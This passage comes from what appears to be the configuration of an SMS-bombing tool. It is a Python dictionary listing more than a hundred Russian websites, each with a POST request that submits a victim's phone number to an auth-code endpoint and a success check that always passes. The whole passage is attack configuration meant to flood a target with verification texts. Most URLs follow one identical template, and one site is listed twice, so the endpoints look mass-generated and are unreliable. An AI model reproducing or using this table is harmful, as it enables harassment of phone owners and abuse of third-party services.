        "method": "POST",
        "headers": lambda: get_common_headers("https://yamadzhi.ru/", "https://yamadzhi.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api952": {
        "name": "SushiWok",
        "url": "https://sushiwok.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sushiwok.ru/", "https://sushiwok.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api953": {
        "name": "Farfor",
        "url": "https://farfor.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://farfor.ru/", "https://farfor.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api954": {
        "name": "Eбидоэби",
        "url": "https://ebidoebi.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ebidoebi.ru/", "https://ebidoebi.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api955": {
        "name": "TanukiDelivery",
        "url": "https://tanuki.ru/delivery/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tanuki.ru/", "https://tanuki.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api956": {
        "name": "SushiMarket",
        "url": "https://sushimarket.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sushimarket.com/", "https://sushimarket.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api957": {
        "name": "MyBox",
        "url": "https://mybox.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mybox.ru/", "https://mybox.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api958": {
        "name": "PizzaDoDo",
        "url": "https://dodopizza.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://dodopizza.com/", "https://dodopizza.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api959": {
        "name": "Foodband",
        "url": "https://foodband.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://foodband.ru/", "https://foodband.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api960": {
        "name": "AlloPizza",
        "url": "https://allopizza.su/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://allopizza.su/", "https://allopizza.su", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api961": {
        "name": "PaPaRoach",
        "url": "https://paparoach.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://paparoach.ru/", "https://paparoach.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api962": {
        "name": "BurgerClub",
        "url": "https://burgerclub.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://burgerclub.ru/", "https://burgerclub.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api963": {
        "name": "SubwayRussia",
        "url": "https://subway.ru.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://subway.ru.com/", "https://subway.ru.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api964": {
        "name": "StardogsRu",
        "url": "https://stardogs.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://stardogs.ru/", "https://stardogs.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api965": {
        "name": "CarlsJr",
        "url": "https://carlsjr.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://carlsjr.ru/", "https://carlsjr.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api966": {
        "name": "BaskinRobbinsRu",
        "url": "https://baskinrobbins.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://baskinrobbins.ru/", "https://baskinrobbins.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api967": {
        "name": "Cinnabon",
        "url": "https://cinnabonrussia.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://cinnabonrussia.com/", "https://cinnabonrussia.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api968": {
        "name": "KrispyKreme",
        "url": "https://krispykreme.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://krispykreme.ru/", "https://krispykreme.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api969": {
        "name": "DunkinDonuts",
        "url": "https://dunkindonuts.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://dunkindonuts.ru/", "https://dunkindonuts.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api970": {
        "name": "StarbucksCoffee",
        "url": "https://starbucks.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://starbucks.com/", "https://starbucks.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api971": {
        "name": "CostaCoffee",
        "url": "https://costacoffee.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://costacoffee.ru/", "https://costacoffee.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api972": {
        "name": "DoubleB",
        "url": "https://dablbee.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://dablbee.ru/", "https://dablbee.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api973": {
        "name": "Skuratov",
        "url": "https://skuratovcoffee.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://skuratovcoffee.ru/", "https://skuratovcoffee.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api974": {
        "name": "PravdinCoffee",
        "url": "https://pravdincoffee.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pravdincoffee.ru/", "https://pravdincoffee.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api975": {
        "name": "ABC_Coffee",
        "url": "https://abccoffee.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://abccoffee.ru/", "https://abccoffee.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api976": {
        "name": "TorkCoffee",
        "url": "https://torkcoffee.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://torkcoffee.ru/", "https://torkcoffee.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api977": {
        "name": "OnePriceCoffee",
        "url": "https://onepricecoffee.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://onepricecoffee.ru/", "https://onepricecoffee.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api978": {
        "name": "CoffeeLike",
        "url": "https://coffeelike.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://coffeelike.ru/", "https://coffeelike.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api979": {
        "name": "Bodryachiy",
        "url": "https://bodryachiy.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bodryachiy.ru/", "https://bodryachiy.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api980": {
        "name": "Zerno",
        "url": "https://zerno.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://zerno.ru/", "https://zerno.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api981": {
        "name": "Cheburek",
        "url": "https://cheburek.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://cheburek.ru/", "https://cheburek.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api982": {
        "name": "Vafli",
        "url": "https://vafli.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vafli.ru/", "https://vafli.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api983": {
        "name": "BlinBel",
        "url": "https://blinbel.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://blinbel.ru/", "https://blinbel.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api984": {
        "name": "ChudoPech",
        "url": "https://chudo-pech.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://chudo-pech.ru/", "https://chudo-pech.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api985": {
        "name": "PirogRu",
        "url": "https://pirog.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pirog.ru/", "https://pirog.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api986": {
        "name": "Sytny",
        "url": "https://sytny.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sytny.ru/", "https://sytny.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api987": {
        "name": "PieShop",
        "url": "https://pieshop.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pieshop.ru/", "https://pieshop.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api988": {
        "name": "Boulangerie",
        "url": "https://boulangerie.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://boulangerie.ru/", "https://boulangerie.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api989": {
        "name": "BakeryHouse",
        "url": "https://bakeryhouse.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bakeryhouse.ru/", "https://bakeryhouse.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api990": {
        "name": "HlebNassushny",
        "url": "https://hlebnassushny.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://hlebnassushny.ru/", "https://hlebnassushny.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api991": {
        "name": "Volkonsky",
        "url": "https://volkonsky.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://volkonsky.com/", "https://volkonsky.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api992": {
        "name": "Karavai",
        "url": "https://karavai.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://karavai.ru/", "https://karavai.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api993": {
        "name": "ZolotoyKolos",
        "url": "https://zolotoykolos.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://zolotoykolos.ru/", "https://zolotoykolos.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api994": {
        "name": "FirstBakery",
        "url": "https://1hleb.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://1hleb.ru/", "https://1hleb.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api995": {
        "name": "Buterbrod",
        "url": "https://buterbrod.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://buterbrod.ru/", "https://buterbrod.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api996": {
        "name": "SandwichShop",
        "url": "https://sandwichshop.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sandwichshop.ru/", "https://sandwichshop.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api997": {
        "name": "SaladBar",
        "url": "https://saladbar.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://saladbar.ru/", "https://saladbar.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api998": {
        "name": "GreenBox",
        "url": "https://greenbox.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://greenbox.ru/", "https://greenbox.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api999": {
        "name": "JustFood",
        "url": "https://justfood.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://justfood.ru/", "https://justfood.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1000": {
        "name": "PerformanceFood",
        "url": "https://p-food.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://p-food.ru/", "https://p-food.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1001": {
        "name": "GrowFood",
        "url": "https://growfood.pro/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://growfood.pro/", "https://growfood.pro", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1002": {
        "name": "LevelKitchen",
        "url": "https://levelkitchen.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://levelkitchen.com/", "https://levelkitchen.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1003": {
        "name": "Befit",
        "url": "https://befit.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://befit.ru/", "https://befit.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1004": {
        "name": "YamDiet",
        "url": "https://yamdiet.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yamdiet.com/", "https://yamdiet.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1005": {
        "name": "MyFood",
        "url": "https://myfood.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://myfood.ru/", "https://myfood.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1006": {
        "name": "FineFood",
        "url": "https://finefood.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://finefood.ru/", "https://finefood.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1007": {
        "name": "Poze",
        "url": "https://poze.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://poze.ru/", "https://poze.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1008": {
        "name": "GeneralFood",
        "url": "https://generalfood.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://generalfood.ru/", "https://generalfood.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1009": {
        "name": "BeFitRu",
        "url": "https://befit.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://befit.ru/", "https://befit.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1010": {
        "name": "FoodMil",
        "url": "https://foodmil.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://foodmil.ru/", "https://foodmil.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1011": {
        "name": "ChefMarket",
        "url": "https://chefmarket.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://chefmarket.ru/", "https://chefmarket.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1012": {
        "name": "Elementaree",
        "url": "https://elementaree.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://elementaree.ru/", "https://elementaree.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1013": {
        "name": "Domavkusno",
        "url": "https://domavkusno.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://domavkusno.ru/", "https://domavkusno.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1014": {
        "name": "Partida",
        "url": "https://partida.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://partida.ru/", "https://partida.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1015": {
        "name": "UжинДома",
        "url": "https://uzhindoma.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://uzhindoma.ru/", "https://uzhindoma.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1016": {
        "name": "Oede",
        "url": "https://oede.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://oede.ru/", "https://oede.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1017": {
        "name": "RussianFood",
        "url": "https://russianfood.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://russianfood.com/", "https://russianfood.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1018": {
        "name": "Gastronom",
        "url": "https://gastronom.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gastronom.ru/", "https://gastronom.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1019": {
        "name": "EdimDoma",
        "url": "https://edimdoma.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://edimdoma.ru/", "https://edimdoma.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1020": {
        "name": "Povar",
        "url": "https://povar.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://povar.ru/", "https://povar.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1021": {
        "name": "Kulinariya",
        "url": "https://kulinariya.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kulinariya.ru/", "https://kulinariya.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1022": {
        "name": "Recepti",
        "url": "https://recepti.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://recepti.ru/", "https://recepti.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1023": {
        "name": "FoodRu",
        "url": "https://food.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://food.ru/", "https://food.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1024": {
        "name": "LifeHack",
        "url": "https://lifehacker.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://lifehacker.ru/", "https://lifehacker.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1025": {
        "name": "AdMe",
        "url": "https://adme.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://adme.ru/", "https://adme.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1026": {
        "name": "Fishki",
        "url": "https://fishki.net/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://fishki.net/", "https://fishki.net", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1027": {
        "name": "JoyReactor",
        "url": "https://joyreactor.cc/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://joyreactor.cc/", "https://joyreactor.cc", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1028": {
        "name": "Yaplakal",
        "url": "https://yaplakal.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yaplakal.com/", "https://yaplakal.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1029": {
        "name": "PikabuRu",
        "url": "https://pikabu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pikabu.ru/", "https://pikabu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1030": {
        "name": "Bashim",
        "url": "https://bash.im/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bash.im/", "https://bash.im", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1031": {
        "name": "AnekdotRu",
        "url": "https://anekdot.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://anekdot.ru/", "https://anekdot.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1032": {
        "name": "FunRu",
        "url": "https://fun.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://fun.ru/", "https://fun.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1033": {
        "name": "HumorFM",
        "url": "https://humor.fm/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://humor.fm/", "https://humor.fm", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1034": {
        "name": "RadioRecord",
        "url": "https://radiorecord.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://radiorecord.ru/", "https://radiorecord.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1035": {
        "name": "EuropaPlus",
        "url": "https://europaplus.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://europaplus.ru/", "https://europaplus.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1036": {
        "name": "AutoRadio",
        "url": "https://avtoradio.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://avtoradio.ru/", "https://avtoradio.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1037": {
        "name": "MaximumRadio",
        "url": "https://maximum.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://maximum.ru/", "https://maximum.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1038": {
        "name": "NasheRadio",
        "url": "https://nashe.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nashe.ru/", "https://nashe.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1039": {
        "name": "RockRadio",
        "url": "https://rockradio.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rockradio.ru/", "https://rockradio.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1040": {
        "name": "MonteCarlo",
        "url": "https://montecarlo.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://montecarlo.ru/", "https://montecarlo.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1041": {
        "name": "RetroFM",
        "url": "https://retrofm.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://retrofm.ru/", "https://retrofm.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1042": {
        "name": "Dfm",
        "url": "https://dfm.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://dfm.ru/", "https://dfm.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1043": {
        "name": "LoveRadio",
        "url": "https://loveradio.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://loveradio.ru/", "https://loveradio.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1044": {
        "name": "EnergyFM",
        "url": "https://energyfm.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://energyfm.ru/", "https://energyfm.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1045": {
        "name": "ComedyRadio",
        "url": "https://comedy-radio.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://comedy-radio.ru/", "https://comedy-radio.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1046": {
        "name": "ZharaFM",
        "url": "https://zharafm.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://zharafm.ru/", "https://zharafm.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1047": {
        "name": "BusinessFM",
        "url": "https://bfm.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bfm.ru/", "https://bfm.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1048": {
        "name": "KommersantFM",
        "url": "https://kommersant.fm/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kommersant.fm/", "https://kommersant.fm", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1049": {
        "name": "GovoritMoskva",
        "url": "https://govoritmoskva.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://govoritmoskva.ru/", "https://govoritmoskva.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1050": {
        "name": "VestiFM",
        "url": "https://radiovesti.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://radiovesti.ru/", "https://radiovesti.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1051": {
        "name": "Mayak",
        "url": "https://radiomayak.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://radiomayak.ru/", "https://radiomayak.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1052": {
        "name": "OrpheusRadio",
        "url": "https://muzcentrum.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://muzcentrum.ru/", "https://muzcentrum.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1053": {
        "name": "KulturaRadio",
        "url": "https://cultradio.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://cultradio.ru/", "https://cultradio.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1054": {
        "name": "SputnikRadio",
        "url": "https://sputniknews.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sputniknews.ru/", "https://sputniknews.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1055": {
        "name": "Pansion",
        "url": "https://pansion.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pansion.ru/", "https://pansion.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1056": {
        "name": "Sanatorium",
        "url": "https://sanatorium.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sanatorium.ru/", "https://sanatorium.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1057": {
        "name": "Kurort",
        "url": "https://kurort.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kurort.ru/", "https://kurort.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1058": {
        "name": "HotelRu",
        "url": "https://hotel.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://hotel.ru/", "https://hotel.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1059": {
        "name": "Bronevik",
        "url": "https://bronevik.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bronevik.com/", "https://bronevik.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1060": {
        "name": "Zima",
        "url": "https://zima.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://zima.ru/", "https://zima.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1061": {
        "name": "Leto",
        "url": "https://leto.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://leto.ru/", "https://leto.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1062": {
        "name": "CampRu",
        "url": "https://camp.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://camp.ru/", "https://camp.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1063": {
        "name": "Incamp",
        "url": "https://incamp.ru/api/v1/auth/code",
        "method": "POST",
